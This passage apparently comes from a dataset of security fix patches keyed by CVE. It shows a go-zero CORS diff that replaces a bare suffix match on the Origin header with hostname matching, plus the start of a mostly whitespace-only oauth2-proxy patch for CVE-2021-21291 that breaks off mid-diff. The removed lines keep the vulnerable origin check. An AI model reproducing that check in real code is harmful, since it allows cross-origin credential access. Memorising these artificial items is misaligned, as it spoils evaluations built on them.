{\n+gw.WriteHeader(http.StatusNoContent)\n+} else {\n+gw.WriteHeader(http.StatusNotFound)\n+}\n+})\n }\n \n // Middleware returns a middleware that adds CORS headers to the response.\n func Middleware(fn func(w http.Header), origins ...string) func(http.HandlerFunc) http.HandlerFunc {\n-\treturn func(next http.HandlerFunc) http.HandlerFunc {\n-\t\treturn func(w http.ResponseWriter, r *http.Request) {\n-\t\t\tcheckAndSetHeaders(w, r, origins)\n-\t\t\tif fn != nil {\n-\t\t\t\tfn(w.Header())\n-\t\t\t}\n-\n-\t\t\tif r.Method == http.MethodOptions {\n-\t\t\t\tw.WriteHeader(http.StatusNoContent)\n-\t\t\t} else {\n-\t\t\t\tnext(w, r)\n-\t\t\t}\n-\t\t}\n-\t}\n+return func(next http.HandlerFunc) http.HandlerFunc {\n+return func(w http.ResponseWriter, r *http.Request) {\n+checkAndSetHeaders(w, r, origins)\n+if fn != nil {\n+fn(w.Header())\n+}\n+\n+if r.Method == http.MethodOptions {\n+w.WriteHeader(http.StatusNoContent)\n+} else {\n+next(w, r)\n+}\n+}\n+}\n }\n \n func checkAndSetHeaders(w http.ResponseWriter, r *http.Request, origins []string) {\n-\tsetVaryHeaders(w, r)\n+setVaryHeaders(w, r)\n \n-\tif len(origins) == 0 {\n-\t\tsetHeader(w, allOrigins)\n-\t\treturn\n-\t}\n+if len(origins) == 0 {\n+setHeader(w, allOrigins)\n+return\n+}\n \n-\torigin := r.Header.Get(originHeader)\n-\tif isOriginAllowed(origins, origin) {\n-\t\tsetHeader(w, origin)\n-\t}\n+origin := r.Header.Get(originHeader)\n+if isOriginAllowed(origins, origin) {\n+setHeader(w, origin)\n+}\n }\n \n func isOriginAllowed(allows []string, origin string) bool {\n-\tfor _, o := range allows {\n-\t\tif o == allOrigins {\n-\t\t\treturn true\n-\t\t}\n+u, err := url.Parse(origin)\n+if err != nil {\n+return false\n+}\n \n-\t\tif strings.HasSuffix(origin, o) {\n-\t\t\treturn true\n-\t\t}\n-\t}\n+host := u.Hostname()\n+for _, o := range allows {\n+if o == allOrigins {\n+return true\n+}\n+\n+allowedHost := o\n+if u, err := url.Parse(o); err == nil && u.Hostname() != \"\" {\n+allowedHost = u.Hostname()\n+}\n \n-\treturn false\n+if host == allowedHost {\n+return true\n+}\n+if strings.HasSuffix(host, \".\"+allowedHost) {\n+return true\n+}\n+}\n+\n+return false\n }\n \n func setHeader(w http.ResponseWriter, origin string) {\n-\theader := w.Header()\n-\theader.Set(allowOrigin, origin)\n-\theader.Set(allowMethods, methods)\n-\theader.Set(allowHeaders, allowHeadersVal)\n-\theader.Set(exposeHeaders, exposeHeadersVal)\n-\tif origin != allOrigins {\n-\t\theader.Set(allowCredentials, allowTrue)\n-\t}\n-\theader.Set(maxAgeHeader, maxAgeHeaderVal)\n+header := w.Header()\n+header.Set(allowOrigin, origin)\n+header.Set(allowMethods, methods)\n+header.Set(allowHeaders, allowHeadersVal)\n+header.Set(exposeHeaders, exposeHeadersVal)\n+if origin != allOrigins {\n+header.Set(allowCredentials, allowTrue)\n+}\n+header.Set(maxAgeHeader, maxAgeHeaderVal)\n }\n \n func setVaryHeaders(w http.ResponseWriter, r *http.Request) {\n-\theader := w.Header()\n-\theader.Add(varyHeader, originHeader)\n-\tif r.Method == http.MethodOptions {\n-\t\theader.Add(varyHeader, requestMethod)\n-\t\theader.Add(varyHeader, requestHeaders)\n-\t}\n+header := w.Header()\n+header.Add(varyHeader, originHeader)\n+if r.Method == http.MethodOptions {\n+header.Add(varyHeader, requestMethod)\n+header.Add(varyHeader, requestHeaders)\n+}\n }\ndiff --git a/rest/internal/cors/handlers.go.tmp b/rest/internal/cors/handlers.go.tmp\nnew file mode 100644\nindex 00000000..dd896221\n--- /dev/null\n+++ b/rest/internal/cors/handlers.go.tmp\n@@ -0,0 +1,132 @@\n+package cors\n+\n+import (\n+\"net/http\"\n+\"net/url\"\n+\"strings\"\n+\n+\"github.com/zeromicro/go-zero/rest/internal/response\"\n+)\n+\n+const (\n+allowOrigin      = \"Access-Control-Allow-Origin\"\n+allOrigins       = \"*\"\n+allowMethods     = \"Access-Control-Allow-Methods\"\n+allowHeaders     = \"Access-Control-Allow-Headers\"\n+allowCredentials = \"Access-Control-Allow-Credentials\"\n+exposeHeaders    = \"Access-Control-Expose-Headers\"\n+requestMethod    = \"Access-Control-Request-Method\"\n+requestHeaders   = \"Access-Control-Request-Headers\"\n+allowHeadersVal  = \"Content-Type, Origin, X-CSRF-Token, Authorization, AccessToken, Token, Range\"\n+exposeHeadersVal = \"Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers\"\n+methods          = \"GET, HEAD, POST, PATCH, PUT, DELETE\"\n+allowTrue        = \"true\"\n+maxAgeHeader     = \"Access-Control-Max-Age\"\n+maxAgeHeaderVal  = \"86400\"\n+varyHeader       = \"Vary\"\n+originHeader     = \"Origin\"\n+)\n+\n+// NotAllowedHandler handles cross domain not allowed requests.\n+// At most one origin can be specified, other origins are ignored if given, default to be *.\n+func NotAllowedHandler(fn func(w http.ResponseWriter), origins ...string) http.Handler {\n+return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n+gw := response.NewHeaderOnceResponseWriter(w)\n+checkAndSetHeaders(gw, r, origins)\n+if fn != nil {\n+fn(gw)\n+}\n+\n+if r.Method == http.MethodOptions {\n+gw.WriteHeader(http.StatusNoContent)\n+} else {\n+gw.WriteHeader(http.StatusNotFound)\n+}\n+})\n+}\n+\n+// Middleware returns a middleware that adds CORS headers to the response.\n+func Middleware(fn func(w http.Header), origins ...string) func(http.HandlerFunc) http.HandlerFunc {\n+return func(next http.HandlerFunc) http.HandlerFunc {\n+return func(w http.ResponseWriter, r *http.Request) {\n+checkAndSetHeaders(w, r, origins)\n+if fn != nil {\n+fn(w.Header())\n+}\n+\n+if r.Method == http.MethodOptions {\n+w.WriteHeader(http.StatusNoContent)\n+} else {\n+next(w, r)\n+}\n+}\n+}\n+}\n+\n+func checkAndSetHeaders(w http.ResponseWriter, r *http.Request, origins []string) {\n+setVaryHeaders(w, r)\n+\n+if len(origins) == 0 {\n+setHeader(w, allOrigins)\n+return\n+}\n+\n+origin := r.Header.Get(originHeader)\n+if isOriginAllowed(origins, origin) {\n+setHeader(w, origin)\n+}\n+}\n+\n+func isOriginAllowed(allows []string, origin string) bool {\n+for _, o := range allows {\n+if o == allOrigins {\n+return true\n+}\n+}\n+\n+u, err := url.Parse(origin)\n+if err != nil {\n+return false\n+}\n+if u.Hostname() == \"\" {\n+return false\n+}\n+host := u.Hostname()\n+\n+for _, o := range allows {\n+allowedHost := o\n+if u, gerr := url.Parse(o); gerr == nil && u.Hostname() != \"\" {\n+allowedHost = u.Hostname()\n+}\n+\n+if host == allowedHost {\n+return true\n+}\n+if strings.HasSuffix(host, \".\"+allowedHost) {\n+return true\n+}\n+}\n+\n+return false\n+}\n+\n+func setHeader(w http.ResponseWriter, origin string) {\n+header := w.Header()\n+header.Set(allowOrigin, origin)\n+header.Set(allowMethods, methods)\n+header.Set(allowHeaders, allowHeadersVal)\n+header.Set(exposeHeaders, exposeHeadersVal)\n+if origin != allOrigins {\n+header.Set(allowCredentials, allowTrue)\n+}\n+header.Set(maxAgeHeader, maxAgeHeaderVal)\n+}\n+\n+func setVaryHeaders(w http.ResponseWriter, r *http.Request) {\n+header := w.Header()\n+header.Add(varyHeader, originHeader)\n+if r.Method == http.MethodOptions {\n+header.Add(varyHeader, requestMethod)\n+header.Add(varyHeader, requestHeaders)\n+}\n+}\n"}
{"cve":"CVE-2021-21291:0708", "fix_patch": "diff --git a/oauthproxy.go b/oauthproxy.go\nindex 36c58c46..f5b2b916 100644\n--- a/oauthproxy.go\n+++ b/oauthproxy.go\n@@ -1,933 +1,933 @@\n package main\n \n import (\n-\t\"context\"\n-\t\"encoding/json\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"html/template\"\n-\t\"net\"\n-\t\"net/http\"\n-\t\"net/url\"\n-\t\"regexp\"\n-\t\"strings\"\n-\t\"time\"\n-\n-\t\"github.com/justinas/alice\"\n-\tipapi \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/apis/ip\"\n-\tmiddlewareapi \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/apis/middleware\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/apis/options\"\n-\tsessionsapi \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/apis/sessions\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/authentication/basic\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/cookies\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/encryption\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/ip\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/logger\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/middleware\"\n-\trequestutil \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/requests/util\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/sessions\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/upstream\"\n-\t\"github.com/oauth2-proxy/oauth2-proxy/v7/providers\"\n+        \"context\"\n+        \"encoding/json\"\n+        \"errors\"\n+        \"fmt\"\n+        \"html/template\"\n+        \"net\"\n+        \"net/http\"\n+        \"net/url\"\n+        \"regexp\"\n+        \"strings\"\n+        \"time\"\n+\n+        \"github.com/justinas/alice\"\n+        ipapi \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/apis/ip\"\n+        middlewareapi \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/apis/middleware\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/apis/options\"\n+        sessionsapi \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/apis/sessions\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/authentication/basic\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/cookies\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/encryption\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/ip\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/logger\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/middleware\"\n+        requestutil \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/requests/util\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/sessions\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/v7/pkg/upstream\"\n+        \"github.com/oauth2-proxy/oauth2-proxy/v7/providers\"\n )\n \n const (\n-\tschemeHTTPS     = \"https\"\n-\tapplicationJSON = \"application/json\"\n+        schemeHTTPS     = \"https\"\n+        applicationJSON = \"application/json\"\n )\n \n var (\n-\t// ErrNeedsLogin means the user should be redirected to the login page\n-\tErrNeedsLogin = errors.New(\"redirect to login page\")\n+        // ErrNeedsLogin means the user should be redirected to the login page\n+        ErrNeedsLogin = errors.New(\"redirect to login page\")\n \n-\t// ErrAccessDenied means the user should receive a 401 Unauthorized response\n-\tErrAccessDenied = errors.New(\"access denied\")\n+        // ErrAccessDenied means the user should receive a 401 Unauthorized response\n+        ErrAccessDenied = errors.New(\"access denied\")\n \n-\t// Used to check final redirects are not susceptible to open redirects.\n-\t// Matches //, /\\ and both of these with whitespace in between (eg / / or / \\).\n-\tinvalidRedirectRegex = regexp.MustCompile(`[/\\\\](?:[\\s\\v]*|\\.{1,2})[/\\\\]`)\n+        // Used to check final redirects are not susceptible to open redirects.\n+        // Matches //, /\\ and both of these with whitespace in between (eg / / or / \\).\n+        invalidRedirectRegex = regexp.MustCompile(`[/\\\\](?:[\\s\\v]*|\\.{1,2})[/\\\\]`)\n )\n \n // allowedRoute manages method + path based allowlists\n type allowedRoute struct {\n-\tmethod    string\n-\tpathRegex *regexp.Regexp\n+        method    string\n+        pathRegex *regexp.Regexp\n }\n \n // OAuthProxy is the main authentication proxy\n type OAuthProxy struct {\n-\tCookieSeed     string\n-\tCookieName     string\n-\tCSRFCookieName string\n-\tCookieDomains  []string\n-\tCookiePath     string\n-\tCookieSecure   bool\n-\tCookieHTTPOnly bool\n-\tCookieExpire   time.Duration\n-\tCookieRefresh  time.Duration\n-\tCookieSameSite string\n-\tValidator      func(string) bool\n-\n-\tRobotsPath        string\n-\tSignInPath        string\n-\tSignOutPath       string\n-\tOAuthStartPath    string\n-\tOAuthCallbackPath string\n-\tAuthOnlyPath      string\n-\tUserInfoPath      string\n-\n-\tallowedRoutes        []allowedRoute\n-\tredirectURL          *url.URL // the url to receive requests at\n-\twhitelistDomains     []string\n-\tprovider             providers.Provider\n-\tproviderNameOverride string\n-\tsessionStore         sessionsapi.SessionStore\n-\tProxyPrefix          string\n-\tSignInMessage        string\n-\tbasicAuthValidator   basic.Validator\n-\tdisplayHtpasswdForm  bool\n-\tserveMux             http.Handler\n-\tSetXAuthRequest      bool\n-\tPassBasicAuth        bool\n-\tSetBasicAuth         bool\n-\tSkipProviderButton   bool\n-\tPassUserHeaders      bool\n-\tBasicAuthPassword    string\n-\tPassAccessToken      bool\n-\tSetAuthorization     bool\n-\tPassAuthorization    bool\n-\tPreferEmailToUser    bool\n-\tskipAuthPreflight    bool\n-\tskipJwtBearerTokens  bool\n-\ttemplates            *template.Template\n-\trealClientIPParser   ipapi.RealClientIPParser\n-\ttrustedIPs           *ip.NetSet\n-\tBanner               string\n-\tFooter               string\n-\n-\tsessionChain alice.Chain\n-\theadersChain alice.Chain\n-\tpreAuthChain alice.Chain\n+        CookieSeed     string\n+        CookieName     string\n+        CSRFCookieName string\n+        CookieDomains  []string\n+        CookiePath     string\n+        CookieSecure   bool\n+        CookieHTTPOnly bool\n+        CookieExpire   time.Duration\n+        CookieRefresh  time.Duration\n+        CookieSameSite string\n+        Validator      func(string) bool\n+\n+        RobotsPath        string\n+        SignInPath        string\n+        SignOutPath       string\n+        OAuthStartPath    string\n+        OAuthCallbackPath string\n+        AuthOnlyPath      string\n+        UserInfoPath      string\n+\n+        allowedRoutes        []allowedRoute\n+        redirectURL          *url.URL // the url to receive requests at\n+        whitelistDomains     []string\n+        provider             providers.Provider\n+        providerNameOverride string\n+        sessionStore         sessionsapi.SessionStore\n+        ProxyPrefix          string\n+        SignInMessage        string\n+        basicAuthValidator   basic.Validator\n+        displayHtpasswdForm  bool\n+        serveMux             http.Handler\n+        SetXAuthRequest      bool\n+        PassBasicAuth        bool\n+        SetBasicAuth         bool\n+        SkipProviderButton   bool\n+        PassUserHeaders      bool\n+        BasicAuthPassword    string\n+        PassAccessToken      bool\n+        SetAuthorization     bool\n+        PassAuthorization    bool\n+        PreferEmailToUser    bool\n+        skipAuthPreflight    bool\n+        skipJwtBearerTokens  bool\n+        templates            *template.Template\n+        realClientIPParser   ipapi.RealClientIPParser\n+        trustedIPs           *ip.NetSet\n+        Banner               string\n+        Footer               string\n+\n+        sessionChain alice.Chain\n+        headersChain alice.Chain\n+        preAuthChain alice.Chain\n }\n \n // NewOAuthProxy creates a new instance of OAuthProxy from the options provided\n func NewOAuthProxy(opts *options.Options, validator func(string) bool) (*OAuthProxy, error) {\n-\tsessionStore, err := sessions.NewSessionStore(&opts.Session, &opts.Cookie)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error initialising session store: %v\", err)\n-\t}\n-\n-\ttemplates := loadTemplates(opts.CustomTemplatesDir)\n-\tproxyErrorHandler := upstream.NewProxyErrorHandler(templates.Lookup(\"error.html\"), opts.ProxyPrefix)\n-\tupstreamProxy, err := upstream.NewProxy(opts.UpstreamServers, opts.GetSignatureData(), proxyErrorHandler)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error initialising upstream proxy: %v\", err)\n-\t}\n-\n-\tif opts.SkipJwtBearerTokens {\n-\t\tlogger.Printf(\"Skipping JWT tokens from configured OIDC issuer: %q\", opts.OIDCIssuerURL)\n-\t\tfor _, issuer := range opts.ExtraJwtIssuers {\n-\t\t\tlogger.Printf(\"Skipping JWT tokens from extra JWT issuer: %q\", issuer)\n-\t\t}\n-\t}\n-\tredirectURL := opts.GetRedirectURL()\n-\tif redirectURL.Path == \"\" {\n-\t\tredirectURL.Path = fmt.Sprintf(\"%s/callback\", opts.ProxyPrefix)\n-\t}\n-\n-\tlogger.Printf(\"OAuthProxy configured for %s Client ID: %s\", opts.GetProvider().Data().ProviderName, opts.ClientID)\n-\trefresh := \"disabled\"\n-\tif opts.Cookie.Refresh != time.Duration(0) {\n-\t\trefresh = fmt.Sprintf(\"after %s\", opts.Cookie.Refresh)\n-\t}\n-\n-\tlogger.Printf(\"Cookie settings: name:%s secure(https):%v httponly:%v expiry:%s domains:%s path:%s samesite:%s refresh:%s\", opts.Cookie.Name, opts.Cookie.Secure, opts.Cookie.HTTPOnly, opts.Cookie.Expire, strings.Join(opts.Cookie.Domains, \",\"), opts.Cookie.Path, opts.Cookie.SameSite, refresh)\n-\n-\ttrustedIPs := ip.NewNetSet()\n-\tfor _, ipStr := range opts.TrustedIPs {\n-\t\tif ipNet := ip.ParseIPNet(ipStr); ipNet != nil {\n-\t\t\ttrustedIPs.AddIPNet(*ipNet)\n-\t\t} else {\n-\t\t\treturn nil, fmt.Errorf(\"could not parse IP network (%s)\", ipStr)\n-\t\t}\n-\t}\n-\n-\tvar basicAuthValidator basic.Validator\n-\tif opts.HtpasswdFile != \"\" {\n-\t\tlogger.Printf(\"using htpasswd file: %s\", opts.HtpasswdFile)\n-\t\tvar err error\n-\t\tbasicAuthValidator, err = basic.NewHTPasswdValidator(opts.HtpasswdFile)\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"could not load htpasswdfile: %v\", err)\n-\t\t}\n-\t}\n-\n-\tallowedRoutes, err := buildRoutesAllowlist(opts)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tpreAuthChain, err := buildPreAuthChain(opts)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"could not build pre-auth chain: %v\", err)\n-\t}\n-\tsessionChain := buildSessionChain(opts, sessionStore, basicAuthValidator)\n-\theadersChain, err := buildHeadersChain(opts)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"could not build headers chain: %v\", err)\n-\t}\n-\n-\treturn &OAuthProxy{\n-\t\tCookieName:     opts.Cookie.Name,\n-\t\tCSRFCookieName: fmt.Sprintf(\"%v_%v\", opts.Cookie.Name, \"csrf\"),\n-\t\tCookieSeed:     opts.Cookie.Secret,\n-\t\tCookieDomains:  opts.Cookie.Domains,\n-\t\tCookiePath:     opts.Cookie.Path,\n-\t\tCookieSecure:   opts.Cookie.Secure,\n-\t\tCookieHTTPOnly: opts.Cookie.HTTPOnly,\n-\t\tCookieExpire:   opts.Cookie.Expire,\n-\t\tCookieRefresh:  opts.Cookie.Refresh,\n-\t\tCookieSameSite: opts.Cookie.SameSite,\n-\t\tValidator:      validator,\n-\n-\t\tRobotsPath:        \"/robots.txt\",\n-\t\tSignInPath:        fmt.Sprintf(\"%s/sign_in\", opts.ProxyPrefix),\n-\t\tSignOutPath:       fmt.Sprintf(\"%s/sign_out\", opts.ProxyPrefix),\n-\t\tOAuthStartPath:    fmt.Sprintf(\"%s/start\", opts.ProxyPrefix),\n-\t\tOAuthCallbackPath: fmt.Sprintf(\"%s/callback\", opts.ProxyPrefix),\n-\t\tAuthOnlyPath:      fmt.Sprintf(\"%s/auth\", opts.ProxyPrefix),\n-\t\tUserInfoPath:      fmt.Sprintf(\"%s/userinfo\", opts.ProxyPrefix),\n-\n-\t\tProxyPrefix:          opts.ProxyPrefix,\n-\t\tprovider:             opts.GetProvider(),\n-\t\tproviderNameOverride: opts.ProviderName,\n-\t\tsessionStore:         sessionStore,\n-\t\tserveMux:             upstreamProxy,\n-\t\tredirectURL:          redirectURL,\n-\t\tallowedRoutes:        allowedRoutes,\n-\t\twhitelistDomains:     opts.WhitelistDomains,\n-\t\tskipAuthPreflight:    opts.SkipAuthPreflight,\n-\t\tskipJwtBearerTokens:  opts.SkipJwtBearerTokens,\n-\t\trealClientIPParser:   opts.GetRealClientIPParser(),\n-\t\tSkipProviderButton:   opts.SkipProviderButton,\n-\t\ttemplates:            templates,\n-\t\ttrustedIPs:           trustedIPs,\n-\t\tBanner:               opts.Banner,\n-\t\tFooter:               opts.Footer,\n-\t\tSignInMessage:        buildSignInMessage(opts),\n-\n-\t\tbasicAuthValidator:  basicAuthValidator,\n-\t\tdisplayHtpasswdForm: basicAuthValidator != nil && opts.DisplayHtpasswdForm,\n-\t\tsessionChain:        sessionChain,\n-\t\theadersChain:        headersChain,\n-\t\tpreAuthChain:        preAuthChain,\n-\t}, nil\n+        sessionStore, err := sessions.NewSessionStore(&opts.Session, &opts.Cookie)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error initialising session store: %v\", err)\n+        }\n+\n+        templates := loadTemplates(opts.CustomTemplatesDir)\n+        proxyErrorHandler := upstream.NewProxyErrorHandler(templates.Lookup(\"error.html\"), opts.ProxyPrefix)\n+        upstreamProxy, err := upstream.NewProxy(opts.UpstreamServers, opts.GetSignatureData(), proxyErrorHandler)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error initialising upstream proxy: %v\", err)\n+        }\n+\n+        if opts.SkipJwtBearerTokens {\n+                logger.Printf(\"Skipping JWT tokens from configured OIDC issuer: %q\", opts.OIDCIssuerURL)\n+                for _, issuer := range opts.ExtraJwtIssuers {\n+                        logger.Printf(\"Skipping JWT tokens from extra JWT issuer: %q\", issuer)\n+                }\n+        }\n+        redirectURL := opts.GetRedirectURL()\n+        if redirectURL.Path == \"\" {\n+                redirectURL.Path = fmt.Sprintf(\"%s/callback\", opts.ProxyPrefix)\n+        }\n+\n+        logger.Printf(\"OAuthProxy configured for %s Client ID: %s\", opts.GetProvider().Data().ProviderName, opts.ClientID)\n+        refresh := \"disabled\"\n+        if opts.Cookie.Refresh != time.Duration(0) {\n+                refresh = fmt.Sprintf(\"after %s\", opts.Cookie.Refresh)\n+        }\n+\n+        logger.Printf(\"Cookie settings: name:%s secure(https):%v httponly:%v expiry:%s domains:%s path:%s samesite:%s refresh:%s\", opts.Cookie.Name, opts.Cookie.Secure, opts.Cookie.HTTPOnly, opts.Cookie.Expire, strings.Join(opts.Cookie.Domains, \",\"), opts.Cookie.Path, opts.Cookie.SameSite, refresh)\n+\n+        trustedIPs := ip.NewNetSet()\n+        for _, ipStr := range opts.TrustedIPs {\n+                if ipNet := ip.ParseIPNet(ipStr); ipNet != nil {\n+                        trustedIPs.AddIPNet(*ipNet)\n+                } else {\n+                        return nil, fmt.Errorf(\"could not parse IP network (%s)\", ipStr)\n+                }\n+        }\n+\n+        var basicAuthValidator basic.Validator\n+        if opts.HtpasswdFile != \"\" {\n+                logger.Printf(\"using htpasswd file: %s\", opts.HtpasswdFile)\n+                var err error\n+                basicAuthValidator, err = basic.NewHTPasswdValidator(opts.HtpasswdFile)\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"could not load htpasswdfile: %v\", err)\n+                }\n+        }\n+\n+        allowedRoutes, err := buildRoutesAllowlist(opts)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        preAuthChain, err := buildPreAuthChain(opts)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"could not build pre-auth chain: %v\", err)\n+        }\n+        sessionChain := buildSessionChain(opts, sessionStore, basicAuthValidator)\n+        headersChain, err := buildHeadersChain(opts)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"could not build headers chain: %v\", err)\n+        }\n+\n+        return &OAuthProxy{\n+                CookieName:     opts.Cookie.Name,\n+                CSRFCookieName: fmt.Sprintf(\"%v_%v\", opts.Cookie.Name, \"csrf\"),\n+                CookieSeed:     opts.Cookie.Secret,\n+                CookieDomains:  opts.Cookie.Domains,\n+                CookiePath:     opts.Cookie.Path,\n+                CookieSecure:   opts.Cookie.Secure,\n+                CookieHTTPOnly: opts.Cookie.HTTPOnly,\n+                CookieExpire:   opts.Cookie.Expire,\n+                CookieRefresh:  opts.Cookie.Refresh,\n+                CookieSameSite: opts.Cookie.SameSite,\n+                Validator:      validator,\n+\n+                RobotsPath:        \"/robots.txt\",\n+                SignInPath:        fmt.Sprintf(\"%s/sign_in\", opts.ProxyPrefix),\n+                SignOutPath:       fmt.Sprintf(\"%s/sign_out\", opts.ProxyPrefix),\n+                OAuthStartPath:    fmt.Sprintf(\"%s/start\", opts.ProxyPrefix),\n+                OAuthCallbackPath: fmt.Sprintf(\"%s/callback\", opts.ProxyPrefix),\n+                AuthOnlyPath:      fmt.Sprintf(\"%s/auth\", opts.ProxyPrefix),\n+                UserInfoPath:      fmt.Sprintf(\"%s/userinfo\", opts.ProxyPrefix),\n+\n+                ProxyPrefix:          opts.ProxyPrefix,\n+                provider:             opts.GetProvider(),\n+                providerNameOverride: opts.ProviderName,\n+                sessionStore:         sessionStore,\n+                serveMux:             upstreamProxy,\n+                redirectURL:          redirectURL,\n+                allowedRoutes:        allowedRoutes,\n+                whitelistDomains:     opts.WhitelistDomains,\n+                skipAuthPreflight:    opts.SkipAuthPreflight,\n+                skipJwtBearerTokens:  opts.SkipJwtBearerTokens,\n+                realClientIPParser:   opts.GetRealClientIPParser(),\n+                SkipProviderButton:   opts.SkipProviderButton,\n+                templates:            templates,\n+                trustedIPs:           trustedIPs,\n+                Banner:               opts.Banner,\n+                Footer:               opts.Footer,\n+                SignInMessage:        buildSignInMessage(opts),\n+\n+                basicAuthValidator:  basicAuthValidator,\n+                displayHtpasswdForm: basicAuthValidator != nil && opts.DisplayHtpasswdForm,\n+                sessionChain:        sessionChain,\n+                headersChain:        headersChain,\n+                preAuthChain:        preAuthChain,\n+        }, nil\n }\n \n // buildPreAuthChain constructs a chain that should process every request before\n // the OAuth2 Proxy authentication logic kicks in.\n // For example forcing HTTPS or health checks.\n func buildPreAuthChain(opts *options.Options) (alice.Chain, error) {\n-\tchain := alice.New(middleware.NewScope(opts.ReverseProxy))\n-\n-\tif opts.ForceHTTPS {\n-\t\t_, httpsPort, err := net.SplitHostPort(opts.HTTPSAddress)\n-\t\tif err != nil {\n-\t\t\treturn alice.Chain{}, fmt.Errorf(\"invalid HTTPS address %q: %v\", opts.HTTPAddress, err)\n-\t\t}\n-\t\tchain = chain.Append(middleware.NewRedirectToHTTPS(httpsPort))\n-\t}\n-\n-\thealthCheckPaths := []string{opts.PingPath}\n-\thealthCheckUserAgents := []string{opts.PingUserAgent}\n-\tif opts.GCPHealthChecks {\n-\t\thealthCheckPaths = append(healthCheckPaths, \"/liveness_check\", \"/readiness_check\")\n-\t\thealthCheckUserAgents = append(healthCheckUserAgents, \"GoogleHC/1.0\")\n-\t}\n-\n-\t// To silence logging of health checks, register the health check handler before\n-\t// the logging handler\n-\tif opts.Logging.SilencePing {\n-\t\tchain = chain.Append(middleware.NewHealthCheck(healthCheckPaths, healthCheckUserAgents), LoggingHandler)\n-\t} else {\n-\t\tchain = chain.Append(LoggingHandler, middleware.NewHealthCheck(healthCheckPaths, healthCheckUserAgents))\n-\t}\n-\n-\treturn chain, nil\n+        chain := alice.New(middleware.NewScope(opts.ReverseProxy))\n+\n+        if opts.ForceHTTPS {\n+                _, httpsPort, err := net.SplitHostPort(opts.HTTPSAddress)\n+                if err != nil {\n+                        return alice.Chain{}, fmt.Errorf(\"invalid HTTPS address %q: %v\", opts.HTTPAddress, err)\n+                }\n+                chain = chain.Append(middleware.NewRedirectToHTTPS(httpsPort))\n+        }\n+\n+        healthCheckPaths := []string{opts.PingPath}\n+        healthCheckUserAgents := []string{opts.PingUserAgent}\n+        if opts.GCPHealthChecks {\n+                healthCheckPaths = append(healthCheckPaths, \"/liveness_check\", \"/readiness_check\")\n+                healthCheckUserAgents = append(healthCheckUserAgents, \"GoogleHC/1.0\")\n+        }\n+\n+        // To silence logging of health checks, register the health check handler before\n+        // the logging handler\n+        if opts.Logging.SilencePing {\n+                chain = chain.Append(middleware.NewHealthCheck(healthCheckPaths, healthCheckUserAgents), LoggingHandler)\n+        } else {\n+                chain = chain.Append(LoggingHandler, middleware.NewHealthCheck(healthCheckPaths, healthCheckUserAgents))\n+        }\n+\n+        return chain, nil\n }\n \n func buildSessionChain(opts *options.Options, sessionStore sessionsapi.SessionStore, validator basic.Validator) alice.Chain {\n-\tchain := alice.New()\n+        chain := alice.New()\n \n-\tif opts.SkipJwtBearerTokens {\n-\t\tsessionLoaders := []middlewareapi.TokenToSessionFunc{\n-\t\t\topts.GetProvider().CreateSessionFromToken,\n-\t\t}\n+        if opts.SkipJwtBearerTokens {\n+                sessionLoaders := []middlewareapi.TokenToSessionFunc{\n+                        opts.GetProvider().CreateSessionFromToken,\n+                }\n \n-\t\tfor _, verifier := range opts.GetJWTBearerVerifiers() {\n-\t\t\tsessionLoaders = append(sessionLoaders,\n-\t\t\t\tmiddlewareapi.CreateTokenToSessionFunc(verifier.Verify))\n-\t\t}\n+                for _, verifier := range opts.GetJWTBearerVerifiers() {\n+                        sessionLoaders = append(sessionLoaders,\n+                                middlewareapi.CreateTokenToSessionFunc(verifier.Verify))\n+                }\n \n-\t\tchain = chain.Append(middleware.NewJwtSessionLoader(sessionLoaders))\n-\t}\n+                chain = chain.Append(middleware.NewJwtSessionLoader(sessionLoaders))\n+        }\n \n-\tif validator != nil {\n-\t\tchain = chain.Append(middleware.NewBasicAuthSessionLoader(validator))\n-\t}\n+        if validator != nil {\n+                chain = chain.Append(middleware.NewBasicAuthSessionLoader(validator))\n+        }\n \n-\tchain = chain.Append(middleware.NewStoredSessionLoader(&middleware.StoredSessionLoaderOptions{\n-\t\tSessionStore:           